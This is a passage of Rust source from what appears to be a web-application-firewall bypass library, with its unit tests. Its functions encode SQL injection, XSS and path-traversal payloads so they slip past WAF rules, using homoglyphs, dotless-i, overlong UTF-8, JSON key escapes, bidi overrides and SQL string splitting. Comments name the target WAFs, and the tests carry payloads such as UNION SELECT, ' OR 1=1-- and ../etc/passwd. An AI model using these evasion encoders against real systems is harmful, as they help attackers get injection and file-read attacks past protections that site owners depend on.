///    (`SQL_Latin1_General_CP1_CI_AI`).
/// 2. **NFKC-normalising** — letterlike block letters (already covered
///    by `letterlike_encode`).
///
/// This function targets class 1 only — for class 2 use
/// [`letterlike_encode`] / `math_*_encode`.
#[must_use]
pub fn script_homoglyph_encode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 2);
    for ch in payload.chars() {
        let mapped = match ch {
            // Cyrillic lowercase lookalikes.
            'a' => '\u{0430}', // CYRILLIC SMALL LETTER A
            'c' => '\u{0441}', // CYRILLIC SMALL LETTER ES
            'e' => '\u{0435}', // CYRILLIC SMALL LETTER IE
            'o' => '\u{043E}', // CYRILLIC SMALL LETTER O
            'p' => '\u{0440}', // CYRILLIC SMALL LETTER ER
            's' => '\u{0455}', // CYRILLIC SMALL LETTER DZE
            'x' => '\u{0445}', // CYRILLIC SMALL LETTER HA
            'y' => '\u{0443}', // CYRILLIC SMALL LETTER U
            // Cyrillic uppercase lookalikes.
            'A' => '\u{0410}',
            'B' => '\u{0412}',
            'C' => '\u{0421}',
            'E' => '\u{0415}',
            'H' => '\u{041D}',
            'K' => '\u{041A}',
            'M' => '\u{041C}',
            'O' => '\u{041E}',
            'P' => '\u{0420}',
            'T' => '\u{0422}',
            'X' => '\u{0425}',
            // Greek lookalikes for remaining letters.
            'n' => '\u{03B7}', // GREEK SMALL LETTER ETA
            'v' => '\u{03BD}', // GREEK SMALL LETTER NU
            c => c,
        };
        out.push(mapped);
    }
    out
}

/// Turkish dotless-i substitution: replace `i`/`I` with U+0131/U+0130.
///
/// U+0131 LATIN SMALL LETTER DOTLESS I does NOT ASCII-uppercase to `I`
/// (it only uppercases to `I` in Turkish locale). A WAF that performs
/// ASCII case-fold via Lua `string.lower` or PHP `strtolower` (CRS
/// default) misses `scrıpt` when looking for `script`. The HTML5 spec
/// requires browsers to normalise U+0131 to `i` in tag names, so
/// `&lt;scrıpt&gt;alert(1)&lt;/scrıpt&gt;` renders as a script tag.
///
/// CVE-class: GitHub auth byass via Turkish dotless-i (dev.to 2018).
#[must_use]
pub fn turkish_i_encode(payload: &str) -> String {
    payload
        .chars()
        .map(|ch| match ch {
            'i' => '\u{0131}',
            'I' => '\u{0130}',
            c => c,
        })
        .collect()
}

/// Sharp-s (ß U+00DF) substitution for `s`/`S`.
///
/// ß lowercases to itself in most locales, but Unicode FULL case-fold
/// (`str::to_lowercase` in Rust, `str.casefold()` in Python) maps the
/// CAPITAL letter sharp s `ẞ` (U+1E9E) to `ss`. WAFs that case-fold
/// before regex see different byte sequence; backends with full
/// Unicode casefold reach the same `script` / `select`. Narrower
/// applicability than [`turkish_i_encode`].
#[must_use]
pub fn sharp_s_encode(payload: &str) -> String {
    payload
        .chars()
        .map(|ch| match ch {
            's' | 'S' => '\u{00DF}', // ß
            c => c,
        })
        .collect()
}

/// AWS WAF JSON-pointer escape — encode every char of `key` as
/// `\uXXXX` so the WAF's JSON-pointer rule (e.g. `/id` literal-match)
/// misses, while the backend JSON parser decodes the escape and
/// routes the value to the original field.
///
/// Returns the JSON fragment `{"<key-escaped>": "<value>"}` ready to
/// drop into a request body. Sicuranext 2024 confirmed bypass.
#[must_use]
pub fn json_key_unicode_escape(key: &str, value: &str) -> String {
    let mut escaped_key = String::with_capacity(key.len() * 6);
    for ch in key.chars() {
        let cp = ch as u32;
        if cp <= 0xFFFF {
            escaped_key.push_str(&format!("\\u{:04x}", cp));
        } else {
            // Surrogate pair for non-BMP codepoints.
            let v = cp - 0x10000;
            let hi = 0xD800 + (v >> 10);
            let lo = 0xDC00 + (v & 0x3FF);
            escaped_key.push_str(&format!("\\u{:04x}\\u{:04x}", hi, lo));
        }
    }
    // Value goes through JSON-safe encode (the existing helper).
    let value_json = serde_json::to_string(value).unwrap_or_else(|_| format!("\"{value}\""));
    format!("{{\"{escaped_key}\": {value_json}}}")
}

/// Overlong UTF-8 encoding of `.` and `/` for path traversal.
///
/// CRS GitHub issue #4189 (opened 2025-07, still open) — CRS does
/// not alert on `%c0%ae%c0%ae%c0%af` (`../` in 2-byte overlong UTF-8).
/// Servers that strictly decode UTF-8 reject these as malformed; older
/// JVMs, some C libs (CVE-2017-9805 Struts2), and a non-trivial set
/// of internal services accept them. WAF gap + permissive backend =
/// path traversal that the WAF doesn't see.
///
/// `width` selects the overlong representation: 2 (default), 3, or 4
/// bytes. Each level is independently checked by some decoders, so a
/// 3-byte overlong may pass where a 2-byte one is filtered.
#[must_use]
pub fn overlong_utf8_path(path: &str, width: u8) -> String {
    let dot = match width {
        2 => "%c0%ae",
        3 => "%e0%80%ae",
        _ => "%f0%80%80%ae", // 4-byte default for unknown width
    };
    let slash = match width {
        2 => "%c0%af",
        3 => "%e0%80%af",
        _ => "%f0%80%80%af",
    };
    let bs = match width {
        2 => "%c0%5c",
        3 => "%e0%80%5c",
        _ => "%f0%80%80%5c",
    };
    path.chars()
        .map(|c| match c {
            '.' => dot.to_string(),
            '/' => slash.to_string(),
            '\\' => bs.to_string(),
            c => c.to_string(),
        })
        .collect()
}

/// Bidi override wrapper — wraps `reversed_keyword` between U+202E
/// (RIGHT-TO-LEFT OVERRIDE) and U+202C (POP DIRECTIONAL FORMATTING).
///
/// The WAF scans left-to-right byte order: it sees `tceleS`. Rendered
/// text in a BiDi-aware viewer (e.g. browser, IDE, security analyst's
/// dashboard) shows `Select`. CVE-2021-42574 (Trojan Source) class.
///
/// **Narrow direct bypass surface** — most SQL parsers reject bare
/// U+202E. Useful primarily for WAF log poisoning and rule-auditing
/// tool confusion; some template engines do strip bidi chars before
/// forwarding, in which case the reversed payload becomes live.
#[must_use]
pub fn bidi_inject(reversed_keyword: &str) -> String {
    format!("\u{202E}{reversed_keyword}\u{202C}")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn unicode_encode_basic() {
        assert_eq!(unicode_encode("A"), "\\u0041");
        assert_eq!(unicode_encode("AB"), "\\u0041\\u0042");
    }

    #[test]
    fn json_unicode_alnum_keyword_split() {
        // "UNION" becomes 5 `\uXXXX` sequences, ASCII bytes nowhere.
        let out = json_unicode_alnum("UNION");
        assert_eq!(out, "\\u0055\\u004E\\u0049\\u004F\\u004E");
        assert!(!out.contains("UNION"));
    }

    #[test]
    fn json_unicode_alnum_leaves_punctuation() {
        // SQLi shape: keywords escaped, structural delimiters bare.
        let out = json_unicode_alnum("' OR 1=1--");
        assert_eq!(out, "' \\u004F\\u0052 \\u0031=\\u0031--");
        let out2 = json_unicode_alnum("AB CD");
        assert_eq!(out2, "\\u0041\\u0042 \\u0043\\u0044");
    }

    #[test]
    fn json_unicode_alnum_idempotent_skip_pass() {
        // Second pass MUST be a no-op — already-escaped \uXXXX
        // sequences are detected and passed through.
        let once = json_unicode_alnum("UNION SELECT");
        let twice = json_unicode_alnum(&once);
        assert_eq!(once, twice, "tamper must stabilize");
    }

    #[test]
    fn json_unicode_alnum_preserves_quote_unencoded() {
        // ' is U+0027 — NOT alphanumeric, so must stay literal.
        let out = json_unicode_alnum("'");
        assert_eq!(out, "'");
    }

    #[test]
    fn json_unicode_alnum_xss_keyword_split() {
        // <script>alert — `<`, `>`, `(`, `)` stay bare; letters/digits escape.
        let out = json_unicode_alnum("<script>alert(1)</script>");
        assert!(!out.contains("script"));
        assert!(!out.contains("alert"));
        assert!(out.contains('<'));
        assert!(out.contains('>'));
        assert!(out.contains('('));
    }

    #[test]
    fn json_unicode_alnum_empty_input() {
        assert_eq!(json_unicode_alnum(""), "");
    }

    #[test]
    fn sql_adjacent_string_concat_basic() {
        // 'admin' (len 5) → 5 single-char adjacent literals.
        assert_eq!(sql_adjacent_string_concat("'admin'"), "'a' 'd' 'm' 'i' 'n'");
    }

    #[test]
    fn sql_adjacent_string_concat_short_literal_unchanged() {
        // Length-1 literals must pass through (already minimum).
        assert_eq!(sql_adjacent_string_concat("'a'"), "'a'");
        assert_eq!(sql_adjacent_string_concat("''"), "''");
    }

    #[test]
    fn sql_adjacent_string_concat_idempotent() {
        // Well-formed (balanced quotes) payload — the literals 'admin'
        // and 'root' each shatter into single-char adjacent literals.
        let once = sql_adjacent_string_concat("WHERE x='admin' OR y='root'");
        let twice = sql_adjacent_string_concat(&once);
        assert_eq!(once, twice, "tamper must stabilize on second pass");
        assert!(once.contains("'a' 'd' 'm' 'i' 'n'"));
        assert!(once.contains("'r' 'o' 'o' 't'"));
    }

    #[test]
    fn sql_adjacent_string_concat_preserves_outside_literal() {
        // No quoted literal in payload — must be a no-op.
        assert_eq!(sql_adjacent_string_concat("1 OR 1=1--"), "1 OR 1=1--");
    }

    #[test]
    fn sql_adjacent_string_concat_handles_escaped_quote() {
        // SQL '' escape inside a literal: the position holding `'` is
        // emitted as the four-quote form `''''` — opening, escaped pair,
        // closing — which parses as a length-1 literal containing `'`.
        // The database reassembles "O" + "'" + "B" + "r" + "i" + "e" + "n".
        let out = sql_adjacent_string_concat("'O''Brien'");
        assert_eq!(out, "'O' '''' 'B' 'r' 'i' 'e' 'n'");
    }

    #[test]
    fn sql_adjacent_string_concat_escaped_quote_idempotent() {
        // Second pass: the `''''` token is a length-1 literal containing
        // `'` (below split threshold). It must pass through unchanged
        // (via the length-1 branch with the escaped-quote sub-case).
        let once = sql_adjacent_string_concat("'O''Brien'");
        let twice = sql_adjacent_string_concat(&once);
        assert_eq!(once, twice);
    }

    #[test]
    fn sql_adjacent_string_concat_single_quote_literal_emits_four_quotes() {
        // A literal of length 1 containing only `'` (source: `''''`)
        // must output the same `''''` (passthrough form).
        let out = sql_adjacent_string_concat("''''");
        assert_eq!(out, "''''");
    }

    #[test]
    fn sql_adjacent_string_concat_its_a_test_shatters_correctly() {
        // The dogfood agent's B5 reproducer.
        let out = sql_adjacent_string_concat("'it''s a test'");
        // Literal content: "it's a test" (11 chars). Each char emits
        // its own single-char literal; the `'` becomes `''''`.
        assert_eq!(out, "'i' 't' '''' 's' ' ' 'a' ' ' 't' 'e' 's' 't'");
    }

    #[test]
    fn sql_adjacent_string_concat_unterminated_quote_passthrough() {
        // Defensive: an unclosed quote must not crash and must not
        // wrap-then-mistakenly-close. Output should preserve the bytes
        // verbatim except for the unmatched-quote tail.
        let out = sql_adjacent_string_concat("'unclosed");
        assert_eq!(out, "'unclosed");
    }

    #[test]
    fn sql_adjacent_string_concat_path_literal_split() {
        // /etc/passwd path literal is a high-fidelity LFI fingerprint.
        // 11 chars → 11 single-char literals; the byte sequence
        // `/etc/passwd` no longer appears contiguously.
        let out = sql_adjacent_string_concat("'/etc/passwd'");
        assert_eq!(out, "'/' 'e' 't' 'c' '/' 'p' 'a' 's' 's' 'w' 'd'");
        assert!(!out.contains("/etc/passwd"));
    }

    #[test]
    fn json_unicode_alnum_unicode_input_passes_through() {
        // Non-ASCII chars (日本語) are NOT ascii_alphanumeric — left bare.
        // This keeps the function focused on the keyword-bypass mission.
        let out = json_unicode_alnum("日本");
        assert_eq!(out, "日本");
    }

    #[test]
    fn unicode_encode_special_chars() {
        let encoded = unicode_encode("' OR 1=1--");
        assert!(encoded.contains("\\u0027")); // '
        assert!(encoded.contains("\\u003D")); // =
    }

    #[test]
    fn unicode_encode_unicode() {
        let encoded = unicode_encode("日本語");
        assert_eq!(encoded, "\\u65E5\\u672C\\u8A9E");
    }

    #[test]
    fn iis_unicode_encode_basic() {
        assert_eq!(iis_unicode_encode("A"), "%u0041");
        assert_eq!(iis_unicode_encode("AB"), "%u0041%u0042");
    }

    #[test]
    fn iis_unicode_encode_bmp_only_for_3byte_utf8() {
        // U+65E5 (日) is BMP — emits as a single %uXXXX, no
        // surrogate. This is the existing happy path.
        assert_eq!(iis_unicode_encode("日"), "%u65E5");
    }

    #[test]
    fn iis_unicode_encode_non_bmp_emits_surrogate_pair() {
        // U+1F600 (😀) is supplementary plane. Pre-fix this emitted
        // `%u1F600` (5 hex digits — invalid IIS %u, silently
        // unencodable, bypass-rate killer). Post-fix it MUST emit a
        // UTF-16 surrogate pair `%uD83D%uDE00`.
        assert_eq!(iis_unicode_encode("😀"), "%uD83D%uDE00");
    }

    #[test]
    fn iis_unicode_encode_mixed_bmp_and_non_bmp() {
        // Adversarial: a mix of plain ASCII + BMP + supplementary
        // must produce exactly one %uXXXX or %uXXXX%uXXXX per char.
        // No 5-digit %u sequences anywhere — pin the regression.
        let out = iis_unicode_encode("A日😀");
        assert_eq!(out, "%u0041%u65E5%uD83D%uDE00");
        // Anti-regression: scan for any 5-hex-digit %u sequence.
        // The fix would silently regress if someone widened the
        // format string to %u{:05X} thinking it "supports" non-BMP.
        for hex_run in out.split("%u").skip(1) {
            let hex_part: String = hex_run
                .chars()
                .take_while(|c| c.is_ascii_hexdigit())
                .collect();
            assert!(
                hex_part.len() == 4,
                "every %u sequence must be exactly 4 hex digits (IIS spec); \
                 got {hex_part:?} in output {out:?}"
            );
        }
    }

    #[test]
    fn json_encode_basic() {
        // F67: encoder produces escaped CONTENT only (no
        // surrounding double-quotes). Callers inject into an
        // existing JSON string field; wrapping our own quotes
        // would break the host JSON document.
        assert_eq!(json_string_encode("A"), "A");
        assert_eq!(json_string_encode("A\\B"), "A\\\\B");
        assert_eq!(json_string_encode("A\"B"), "A\\\"B");
        assert_eq!(json_string_encode("A\nB"), "A\\nB");
    }

    #[test]
    fn json_encode_control_chars() {
        assert_eq!(json_string_encode("\x01"), "\\u0001");
    }

    #[test]
    fn html_entity_encode_basic() {
        assert_eq!(html_entity_encode("A"), "&#x41;");
        assert_eq!(html_entity_encode("AB"), "&#x41;&#x42;");
    }

    #[test]
    fn html_entity_encode_special_chars() {
        let encoded = html_entity_encode("<script>");
        assert_eq!(encoded, "&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;");
    }

    #[test]
    fn html_entity_decimal_encode_basic() {
        assert_eq!(html_entity_decimal_encode("A"), "&#65;");
        assert_eq!(html_entity_decimal_encode("<"), "&#60;");
    }

    #[test]
    fn html_entity_encode_empty() {
        assert_eq!(html_entity_encode(""), "");
    }

    // ── html_entity_variants tests ─────────────────────────────────────

    #[test]
    fn html_entity_variants_cycles_four_forms() {
        // 'A'=0x41=65 — verify each of the four rotation slots
        let encoded = html_entity_variants("AAAA");
        assert_eq!(encoded, "&#x41;&#X41;&#65;&#00065;");
    }

    #[test]
    fn html_entity_variants_continues_rotation() {
        // 'A'=65 — fifth char returns to slot 0 (lowercase-x hex)
        let encoded = html_entity_variants("AAAAA");
        assert_eq!(encoded, "&#x41;&#X41;&#65;&#00065;&#x41;");
    }

    #[test]
    fn html_entity_variants_empty() {
        assert_eq!(html_entity_variants(""), "");
    }

    #[test]
    fn html_entity_variants_xss_payload() {
        // '<' = 0x3C = 60, 's'=0x73=115, '>'=0x3E=62
        // First three chars use slots 0, 1, 2:
        let encoded = html_entity_variants("<s>");
        assert_eq!(encoded, "&#x3c;&#X73;&#62;");
    }

    #[test]
    fn html_entity_variants_unicode_codepoint() {
        // emoji U+1F600 ('😀') — codepoint 128512 — exercises higher-bit chars
        let encoded = html_entity_variants("\u{1F600}");
        assert_eq!(encoded, "&#x1f600;");
    }

    #[test]
    fn html_entity_variants_distinct_from_canonical() {
        // 4+ char payload MUST differ from canonical html_entity_encode
        // (canonical is always lowercase-x hex with semicolon)
        let canon = html_entity_encode("ABCD");
        let var = html_entity_variants("ABCD");
        assert_ne!(canon, var);
    }

    #[test]
    fn html_entity_variants_deterministic() {
        // Same input → same output (no randomness; rotation is by index)
        assert_eq!(
            html_entity_variants("hello world"),
            html_entity_variants("hello world")
        );
    }

    // ── math_bold_encode tests ─────────────────────────────────────────

    #[test]
    fn math_bold_encode_uppercase() {
        assert_eq!(math_bold_encode("A"), "\u{1D400}"); // 𝐀
        assert_eq!(math_bold_encode("Z"), "\u{1D419}"); // 𝐙
    }

    #[test]
    fn math_bold_encode_lowercase() {
        assert_eq!(math_bold_encode("a"), "\u{1D41A}"); // 𝐚
        assert_eq!(math_bold_encode("z"), "\u{1D433}"); // 𝐳
    }

    #[test]
    fn math_bold_encode_digits() {
        assert_eq!(math_bold_encode("0"), "\u{1D7CE}"); // 𝟎
        assert_eq!(math_bold_encode("9"), "\u{1D7D7}"); // 𝟗
    }

    #[test]
    fn math_bold_encode_sql_keyword() {
        // SELECT → 𝐒𝐄𝐋𝐄𝐂𝐓
        let encoded = math_bold_encode("SELECT");
        assert_eq!(encoded.chars().count(), 6);
        for ch in encoded.chars() {
            assert!(
                (0x1D400..=0x1D419).contains(&(ch as u32)),
                "expected math bold capital, got U+{:04X}",
                ch as u32
            );
        }
    }

    #[test]
    fn math_bold_encode_preserves_punctuation() {
        // ' OR 1=1-- — only letters/digits transform; punctuation stays
        let encoded = math_bold_encode("' OR 1=1--");
        // ' space = = - - all unchanged
        assert!(encoded.starts_with('\''));
        assert!(encoded.contains('='));
        assert!(encoded.ends_with("--"));
    }

    #[test]
    fn math_bold_encode_mixed_alphanumeric() {
        let encoded = math_bold_encode("Aa0");
        // A → 𝐀, a → 𝐚, 0 → 𝟎
        let chars: Vec<char> = encoded.chars().collect();
        assert_eq!(chars.len(), 3);
        assert_eq!(chars[0] as u32, 0x1D400);
        assert_eq!(chars[1] as u32, 0x1D41A);
        assert_eq!(chars[2] as u32, 0x1D7CE);
    }

    #[test]
    fn math_bold_encode_distinct_from_fullwidth() {
        // Fullwidth uses U+FF00 block; math bold uses U+1D400 block
        // The same input must produce different bytes (proving they're not equivalent).
        assert_ne!(math_bold_encode("SELECT"), fullwidth_encode("SELECT"));
    }

    #[test]
    fn math_bold_encode_empty() {
        assert_eq!(math_bold_encode(""), "");
    }

    // ── math_italic / script / fraktur / double_struck tests ────────────

    #[test]
    fn math_italic_encode_uppercase() {
        assert_eq!(math_italic_encode("A"), "\u{1D434}"); // 𝐴
        assert_eq!(math_italic_encode("Z"), "\u{1D44D}"); // 𝑍
    }

    #[test]
    fn math_italic_encode_handles_h_hole() {
        // U+1D455 is reserved (the hole); we substitute U+210E.
        assert_eq!(math_italic_encode("h"), "\u{210E}");
    }

    #[test]
    fn math_italic_encode_is_distinct_from_bold() {
        assert_ne!(math_italic_encode("SELECT"), math_bold_encode("SELECT"));
    }

    #[test]
    fn math_script_encode_fills_all_holes() {
        // Every uppercase letter must map to SOMETHING (no panic, no
        // fall-through to ASCII).
        for c in 'A'..='Z' {
            let s: String = c.to_string();
            let enc = math_script_encode(&s);
            assert!(
                enc != s,
                "math_script_encode left {c} unchanged — hole not filled"
            );
        }
    }

    #[test]
    fn math_fraktur_encode_fills_chizr_holes() {
        for c in &['C', 'H', 'I', 'R', 'Z'] {
            let s: String = c.to_string();
            assert!(
                math_fraktur_encode(&s) != s,
                "math_fraktur_encode left {c} unchanged"
            );
        }
    }

    #[test]
    fn math_double_struck_encode_digits_distinct_from_bold() {
        // double-struck 0 = U+1D7D8 ≠ bold 0 = U+1D7CE
        assert_ne!(math_double_struck_encode("0"), math_bold_encode("0"));
    }

    #[test]
    fn math_double_struck_encode_fills_letter_holes() {
        for c in &['C', 'H', 'N', 'P', 'Q', 'R', 'Z'] {
            let s: String = c.to_string();
            assert!(math_double_struck_encode(&s) != s);
        }
    }

    #[test]
    fn letterlike_encode_select_payload_uses_letterlike_block() {
        let encoded = letterlike_encode("SELECT");
        // L → U+2112 SCRIPT CAPITAL L (the headline letterlike sub).
        assert!(encoded.contains('\u{2112}'));
        // S has no letterlike-block equivalent; falls back to circled
        // Latin (U+24CE).
        assert!(encoded.chars().any(|c| c as u32 >= 0x24B6 && c as u32 <= 0x24E9));
    }

    #[test]
    fn letterlike_encode_preserves_non_letters() {
        assert_eq!(letterlike_encode(" ' = "), " ' = ");
    }

    #[test]
    fn all_new_encoders_preserve_pure_punctuation() {
        // Pure punctuation — no letters, no digits — must round-trip
        // through every encoder unchanged. (Digits ARE transformed
        // by math_double_struck_encode, so we exclude them.)
        for f in [
            math_italic_encode,
            math_script_encode,
            math_fraktur_encode,
            math_double_struck_encode,
            letterlike_encode,
        ] {
            assert_eq!(f("' = -- /* */ ;"), "' = -- /* */ ;");
        }
    }

    #[test]
    fn all_new_encoders_distinct_from_each_other() {
        let s = "SELECT";
        let bold = math_bold_encode(s);
        let italic = math_italic_encode(s);
        let script = math_script_encode(s);
        let fraktur = math_fraktur_encode(s);
        let dstruck = math_double_struck_encode(s);
        let letter = letterlike_encode(s);
        let outputs = [bold, italic, script, fraktur, dstruck, letter];
        let set: std::collections::BTreeSet<&String> = outputs.iter().collect();
        assert_eq!(set.len(), outputs.len(), "two encoders produced identical output");
    }

    // ── zero-width + combining-mark injection tests ────────────────────

    #[test]
    fn zero_width_inject_adds_chars_between_letters() {
        let out = zero_width_inject("script", '\u{200B}');
        assert!(out.contains("scr\u{200B}ipt") || out.contains("s\u{200B}c"));
        // Length grows by N-1 codepoints (one between each pair).
        assert_eq!(out.chars().count(), 6 + 5);
    }

    #[test]
    fn zero_width_inject_preserves_non_alnum() {
        // Insert only between alnum chars, not punctuation.
        let out = zero_width_inject("' OR '1'='1", '\u{200C}');
        // The lone `'` chars don't trigger insertion before them.
        assert!(!out.starts_with('\u{200C}'));
    }

    #[test]
    fn zero_width_defaults_count_correct() {
        // Five-element cycle so rotation covers ZWSP/ZWNJ/ZWJ/BOM/CGJ.
        assert_eq!(ZERO_WIDTH_DEFAULTS.len(), 5);
    }

    #[test]
    fn combining_mark_inject_only_after_letters() {
        let out = combining_mark_inject("a1b2", '\u{0308}');
        // 'a' + ̈ + '1' + 'b' + ̈ + '2' — digits don't get marks.
        assert_eq!(out, "a\u{0308}1b\u{0308}2");
    }

    // ── script_homoglyph_encode tests ──────────────────────────────────

    #[test]
    fn script_homoglyph_select_uses_cyrillic_letters() {
        let out = script_homoglyph_encode("SELECT");
        // S → Cyrillic (no Cyrillic S — falls through to itself OR
        // gets mapped to one of the upper substitutions). E → U+0415.
        assert!(out.contains('\u{0415}'));
        // T → U+0422
        assert!(out.contains('\u{0422}'));
        // Output is byte-distinct from input.
        assert_ne!(out, "SELECT");
    }

    #[test]
    fn script_homoglyph_preserves_punctuation() {
        assert_eq!(script_homoglyph_encode("' = -- ;"), "' = -- ;");
    }

    // ── turkish_i + sharp_s tests ──────────────────────────────────────

    #[test]
    fn turkish_i_encode_replaces_only_i() {
        assert_eq!(turkish_i_encode("script"), "scr\u{0131}pt");
        assert_eq!(turkish_i_encode("INSERT"), "\u{0130}NSERT");
        // 'a', 'b' etc. unchanged.
        assert_eq!(turkish_i_encode("abcdefg"), "abcdefg");
    }

    #[test]
    fn sharp_s_encode_replaces_only_s() {
        assert_eq!(sharp_s_encode("select"), "\u{00DF}elect");
        assert_eq!(sharp_s_encode("SELECT"), "\u{00DF}ELECT");
    }

    // ── json_key_unicode_escape tests ──────────────────────────────────

    #[test]
    fn json_key_escape_full_id_payload() {
        let s = json_key_unicode_escape("id", "1 OR 1=1--");
        // Each char of "id" becomes \uXXXX.
        assert!(s.contains("\\u0069")); // i
        assert!(s.contains("\\u0064")); // d
        // Value JSON-encoded.
        assert!(s.contains("1 OR 1=1--"));
    }

    #[test]
    fn json_key_escape_round_trips_through_serde() {
        let s = json_key_unicode_escape("admin", "true");
        let parsed: serde_json::Value = serde_json::from_str(&s).expect("valid JSON");
        // After parsing, the key decodes back to "admin".
        assert!(parsed.get("admin").is_some(), "decoded key missing: {s}");
    }

    #[test]
    fn json_key_escape_preserves_value_quotes() {
        let s = json_key_unicode_escape("k", "v\"q");
        // serde_json escapes the inner quote.
        assert!(s.contains("v\\\"q"));
    }

    // ── overlong_utf8_path tests ───────────────────────────────────────

    #[test]
    fn overlong_utf8_2byte_dot_slash_replaces() {
        assert_eq!(overlong_utf8_path("../etc/passwd", 2), "%c0%ae%c0%ae%c0%afetc%c0%afpasswd");
    }

    #[test]
    fn overlong_utf8_3byte_dot_slash() {
        let out = overlong_utf8_path("..", 3);
        assert_eq!(out, "%e0%80%ae%e0%80%ae");
    }

    #[test]
    fn overlong_utf8_4byte_default() {
        let out = overlong_utf8_path(".", 4);
        assert_eq!(out, "%f0%80%80%ae");
    }

    #[test]
    fn overlong_utf8_preserves_non_traversal_chars() {
        let out = overlong_utf8_path("../etc/passwd", 2);
        assert!(out.contains("etc"));
        assert!(out.contains("passwd"));
    }

    #[test]
    fn overlong_utf8_handles_backslash() {
        assert_eq!(overlong_utf8_path("..\\windows", 2), "%c0%ae%c0%ae%c0%5cwindows");
    }

    // ── bidi_inject tests ──────────────────────────────────────────────

    #[test]
    fn bidi_inject_wraps_with_rlo_and_pdf() {
        let out = bidi_inject("tceleS");
        assert!(out.starts_with('\u{202E}'));
        assert!(out.ends_with('\u{202C}'));
        // 1 RLO + 6 letters + 1 PDF.
        assert_eq!(out.chars().count(), 8);
    }

    // ── sql_concat_split tests ─────────────────────────────────────────

    #[test]
    fn sql_concat_split_admin() {
        assert_eq!(sql_concat_split("'admin'"), "CONCAT('a','d','m','i','n')");
    }

    #[test]
    fn sql_concat_split_password() {
        assert_eq!(
            sql_concat_split("'password'"),
            "CONCAT('p','a','s','s','w','o','r','d')"
        );
    }

    #[test]
    fn sql_concat_split_in_clause() {
        assert_eq!(
            sql_concat_split("WHERE u='admin'"),
            "WHERE u=CONCAT('a','d','m','i','n')"
        );
    }

    #[test]
    fn sql_concat_split_no_quotes_passthrough() {
        // No single quotes → input unchanged
        assert_eq!(sql_concat_split("SELECT 1"), "SELECT 1");
    }

    #[test]
    fn sql_concat_split_multiple_literals() {
        // Two separate strings get independent CONCAT calls
        assert_eq!(sql_concat_split("'a' OR 'b'"), "CONCAT('a') OR CONCAT('b')");
    }

    #[test]
    fn sql_concat_split_empty_literal() {
        assert_eq!(sql_concat_split("''"), "CONCAT('')");
    }

    #[test]
    fn sql_concat_split_unbalanced_quote_passthrough() {
        // Lone opening quote with no closer → output preserves it
        assert_eq!(sql_concat_split("'unclosed"), "'unclosed");
    }

    #[test]
    fn sql_concat_split_preserves_non_quote_chars() {
        // SQL keywords, operators, whitespace all unchanged
        let payload = "1=1; SELECT 'x', 'y' FROM dual";
        let out = sql_concat_split(payload);
        assert!(out.contains("SELECT"));
        assert!(out.contains("FROM dual"));
        assert!(out.contains("CONCAT('x')"));
        assert!(out.contains("CONCAT('y')"));
    }

    #[test]
    fn sql_concat_split_real_injection_payload() {
        // Classic UNION SELECT extraction
        let payload = "' UNION SELECT 'admin','password' FROM users--";
        let out = sql_concat_split(payload);
        // Outer ' is unbalanced; collects up to ' before admin then closes there.
        // The first CONCAT contains the OR/UNION/SELECT keywords as char args —
        // not a useful execution path, but it demonstrates the tamper is
        // applied uniformly. The point is: every single-quoted region becomes
        // CONCAT, so a downstream layer can compose this with other tampers.
        assert!(out.contains("CONCAT("));
        // Real payloads that benefit start the quote OPEN and close it
        // before the SQL keywords, e.g. "1' UNION SELECT 'admin'--" where
        // the embedded 'admin' is the bypass target.
    }

    // ── sql_char_decompose tests ───────────────────────────────────────

    #[test]
    fn sql_char_decompose_admin() {
        // 'a'=97 'd'=100 'm'=109 'i'=105 'n'=110
        assert_eq!(sql_char_decompose("'admin'"), "CHAR(97,100,109,105,110)");
    }

    #[test]
    fn sql_char_decompose_password() {
        assert_eq!(
            sql_char_decompose("'password'"),
            "CHAR(112,97,115,115,119,111,114,100)"
        );
    }

    #[test]
    fn sql_char_decompose_path_literal() {
        // '/etc/passwd' — every byte represented numerically
        // '/'=47 'e'=101 't'=116 'c'=99 '/'=47 'p'=112 'a'=97 's'=115 's'=115 'w'=119 'd'=100
        assert_eq!(
            sql_char_decompose("'/etc/passwd'"),
            "CHAR(47,101,116,99,47,112,97,115,115,119,100)"
        );
    }

    #[test]
    fn sql_char_decompose_no_quotes_passthrough() {
        assert_eq!(sql_char_decompose("SELECT 1"), "SELECT 1");
    }

    #[test]
    fn sql_char_decompose_empty_literal_preserves_empty_string() {
        // F60 regression: pre-fix `''` produced `CHAR()` which is
        // NULL in MySQL — breaking `pass='' OR 1=1` auth bypass
        // (`= NULL` is never TRUE). Post-fix the empty literal
        // round-trips unchanged.
        assert_eq!(sql_char_decompose("''"), "''");
        // Embedded in a longer payload too.
        assert_eq!(
            sql_char_decompose("WHERE pass='' OR 1=1"),
            "WHERE pass='' OR 1=1"
        );
    }

    // sql_char_decompose_empty_literal_preserves_empty_string above
    // supersedes the pre-fix test that asserted CHAR() — kept as a
    // marker rather than re-asserting the buggy old contract.

    #[test]
    fn sql_char_decompose_unbalanced_passthrough() {
        assert_eq!(sql_char_decompose("'unclosed"), "'unclosed");
    }

    #[test]
    fn sql_char_decompose_multiple_literals() {
        // 'a'=97  'b'=98
        assert_eq!(sql_char_decompose("'a' OR 'b'"), "CHAR(97) OR CHAR(98)");
    }

    #[test]
    fn sql_char_decompose_distinct_from_concat_split() {
        // CONCAT uses single-char strings; CHAR uses ints. Outputs differ.
        assert_ne!(sql_char_decompose("'admin'"), sql_concat_split("'admin'"));
    }

    #[test]
    fn sql_char_decompose_real_injection() {
        let payload = "1 OR username='admin'--";
        let out = sql_char_decompose(payload);
        assert_eq!(out, "1 OR username=CHAR(97,100,109,105,110)--");
    }

    // ── pg_chr_decompose tests ─────────────────────────────────────────

    #[test]
    fn pg_chr_decompose_admin() {
        assert_eq!(
            pg_chr_decompose("'admin'"),
            "(CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110))"
        );
    }

    #[test]
    fn pg_chr_decompose_empty_literal() {
        assert_eq!(pg_chr_decompose("''"), "('')");
    }

    #[test]
    fn pg_chr_decompose_in_where_clause() {
        assert_eq!(pg_chr_decompose("WHERE u='a'"), "WHERE u=(CHR(97))");
    }

    #[test]
    fn pg_chr_decompose_distinct_from_char_decompose() {
        // CHR() is unary + pipe-concat; CHAR() is variadic. Different shapes.
        assert_ne!(pg_chr_decompose("'admin'"), sql_char_decompose("'admin'"));
    }

    #[test]
